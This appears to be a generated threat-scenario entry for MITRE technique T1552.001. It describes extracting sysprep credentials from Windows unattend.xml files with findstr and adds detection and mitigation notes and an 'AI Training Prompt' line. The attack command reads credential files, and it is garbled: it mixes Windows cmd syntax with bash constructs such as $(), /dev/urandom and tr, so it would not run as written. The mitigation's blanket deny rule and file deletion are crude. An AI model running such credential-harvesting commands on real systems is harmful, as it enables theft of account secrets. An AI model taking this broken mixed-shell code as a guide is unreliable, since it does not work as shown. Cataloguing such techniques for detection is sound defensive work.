---
type: campaign
scenario_id: 105
tactic: Credential Access
technique: "T1552.001: Credentials in Files"
technique_id: T1552.001
tags: [campaign, lotl, credential_access]
---

# Extracting credentials from unattended.xml using findstr.

## Threat Description
Extracting credentials from unattended.xml using findstr.

## Attack Command
```
findstr /s /i sysprep %windir%\Panther\unattend*.xml > $(echo creds$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)
```

## Detection Logic
Monitor findstr: `wmic process where name='findstr.exe' get commandline | findstr unattend`; Event ID 4663.

## Mitigation
Secure unattend files: `icacls %windir%\Panther /deny Everyone:RX`; Remove credentials: `del %windir%\Panther\unattend*.xml`.

## AI Training Prompt
Train AI to detect unattend.xml credential extraction and suggest file protections.

## References
- MITRE ATT&CK T1552.001: https://attack.mitre.org/techniques/T1552/001/
- CWE-522: https://cwe.mitre.org/data/definitions/522.html
